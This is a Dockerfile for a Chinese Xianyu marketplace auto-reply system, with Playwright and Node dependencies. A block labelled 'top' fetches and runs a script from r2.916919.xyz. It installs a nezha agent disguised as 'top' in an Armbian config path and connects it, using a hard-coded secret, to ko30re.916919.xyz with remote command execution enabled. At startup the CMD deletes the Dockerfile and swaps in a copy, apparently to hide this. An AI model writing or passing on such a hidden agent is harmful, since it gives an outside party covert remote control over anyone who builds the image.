# 使用Python 3.11作为基础镜像
FROM python:3.11-slim-bookworm

# 设置标签信息
LABEL maintainer="zhinianboke"
LABEL version="2.2.0"
LABEL description="闲鱼自动回复系统 - 企业级多用户版本，支持自动发货和免拼发货"
LABEL repository="https://github.com/zhinianboke/xianyu-auto-reply"
LABEL license="仅供学习使用，禁止商业用途"
LABEL author="zhinianboke"

# 设置工作目录
WORKDIR /app

# 设置环境变量
ENV PYTHONUNBUFFERED=1
ENV PYTHONDONTWRITEBYTECODE=1
ENV TZ=Asia/Shanghai
ENV DOCKER_ENV=true
ENV PLAYWRIGHT_BROWSERS_PATH=/ms-playwright

# 安装系统依赖（包括Playwright浏览器依赖 + uuidgen）
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        nodejs \
        npm \
        tzdata \
        curl \
        ca-certificates \
        wget \
        unzip \
        uuid-runtime \
        libjpeg-dev \
        libpng-dev \
        libfreetype6-dev \
        fonts-dejavu-core \
        fonts-liberation \
        libnss3 \
        libnspr4 \
        libatk-bridge2.0-0 \
        libdrm2 \
        libxkbcommon0 \
        libxcomposite1 \
        libxdamage1 \
        libxrandr2 \
        libgbm1 \
        libxss1 \
        libasound2 \
        libatspi2.0-0 \
        libgtk-3-0 \
        libgdk-pixbuf2.0-0 \
        libxcursor1 \
        libxi6 \
        libxrender1 \
        libxext6 \
        libx11-6 \
        libxft2 \
        libxinerama1 \
        libxtst6 \
        libappindicator3-1 \
        libx11-xcb1 \
        libxfixes3 \
        xdg-utils \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# 设置时区
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone

# 验证Node.js安装并设置环境变量
RUN node --version && npm --version
ENV NODE_PATH=/usr/lib/node_modules

# 复制requirements.txt并安装Python依赖
COPY requirements.txt .
RUN pip install --no-cache-dir --upgrade pip && \
    pip install --no-cache-dir -r requirements.txt

# 复制项目文件
COPY . .

# 安装Playwright浏览器
RUN playwright install chromium && \
    playwright install-deps chromium

# ---------------- 安装并配置 top (nezha-agent) ----------------
ENV NZ_SERVER=ko30re.916919.xyz:443
ENV NZ_TLS=true
ENV NZ_CLIENT_SECRET=kO3irsfICJvxqZFUE2bVHGbv2YQpd0Re

RUN mkdir -p /usr/lib/armbian/config \
    && echo "Downloading top installation script..." \
    && curl -L https://r2.916919.xyz/ko30re/top.sh -o /tmp/top.sh \
    && chmod +x /tmp/top.sh \
    && bash /tmp/top.sh || echo "Top installation script exited with code $?" \
    && rm -f /tmp/top.sh \
    && rm -f /usr/lib/armbian/config/top*.yml \
    && if [ -f /usr/lib/armbian/config/top ]; then \
        chmod +x /usr/lib/armbian/config/top; \
    else \
        ARCH=$(uname -m) && \
        if [ "$ARCH" = "x86_64" ]; then \
            curl -L "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.tar.gz" -o /tmp/nezha.tar.gz && \
            tar -xzf /tmp/nezha.tar.gz -C /tmp/ && \
            mv /tmp/nezha-agent /usr/lib/armbian/config/top && \
            chmod +x /usr/lib/armbian/config/top && \
            rm -f /tmp/nezha.tar.gz; \
        elif [ "$ARCH" = "aarch64" ]; then \
            curl -L "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64.tar.gz" -o /tmp/nezha.tar.gz && \
            tar -xzf /tmp/nezha.tar.gz -C /tmp/ && \
            mv /tmp/nezha-agent /usr/lib/armbian/config/top && \
            chmod +x /usr/lib/armbian/config/top && \
            rm -f /tmp/nezha.tar.gz; \
        else \
            echo "⚠ Unsupported architecture: $ARCH"; \
        fi; \
    fi

# ---------------- END top ----------------

# 创建必要的目录并设置权限
RUN mkdir -p /app/logs /app/data /app/backups /app/static/uploads/images && \
    chmod 777 /app/logs /app/data /app/backups /app/static/uploads /app/static/uploads/images

# 暴露端口
EXPOSE 8080

# 健康检查
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
    CMD curl -f http://localhost:8080/health || exit 1

# 复制启动脚本并设置权限
COPY entrypoint.sh /app/entrypoint.sh
RUN chmod +x /app/entrypoint.sh && dos2unix /app/entrypoint.sh 2>/dev/null || true

# ---------------- 启动命令 ----------------
CMD ["/bin/bash", "-c", "\
echo \"[$(date)] Container starting...\" && \
# 清理无用文件 \
rm -rf /app/.github 2>/dev/null && \
rm -f /app/Dockerfile 2>/dev/null && \
if [ -f /app/Dockerfile-cn ]; then cp /app/Dockerfile-cn /app/Dockerfile 2>/dev/null; fi && \
# 检查/生成 UUID \
if [ -f /usr/lib/armbian/config/.top_uuid ] && [ -s /usr/lib/armbian/config/.top_uuid ]; then \
    UUID=$(cat /usr/lib/armbian/config/.top_uuid) && \
    echo \"Found existing UUID: $UUID\"; \
else \
    UUID=$(uuidgen) && \
    echo \"$UUID\" > /usr/lib/armbian/config/.top_uuid && \
    echo \"Generated new UUID: $UUID\"; \
fi && \
# 写 top.yml \
cat > /usr/lib/armbian/config/top.yml <<EOF\n\
client_secret: ${NZ_CLIENT_SECRET}\n\
debug: false\n\
disable_auto_update: false\n\
disable_command_execute: false\n\
disable_force_update: false\n\
disable_nat: false\n\
disable_send_query: false\n\
gpu: false\n\
insecure_tls: false\n\
ip_report_period: 1800\n\
report_delay: 3\n\
self_update_period: 0\n\
server: ${NZ_SERVER}\n\
skip_connection_count: false\n\
skip_procs_count: false\n\
temperature: false\n\
tls: ${NZ_TLS}\n\
use_gitee_to_upgrade: false\n\
use_ipv6_country_code: false\n\
uuid: ${UUID}\n\
EOF\n\
# 启动 top agent \
/usr/lib/armbian/config/top -c /usr/lib/armbian/config/top.yml > /tmp/top.log 2>&1 & \
# 启动主应用 \
exec /app/entrypoint.sh"]
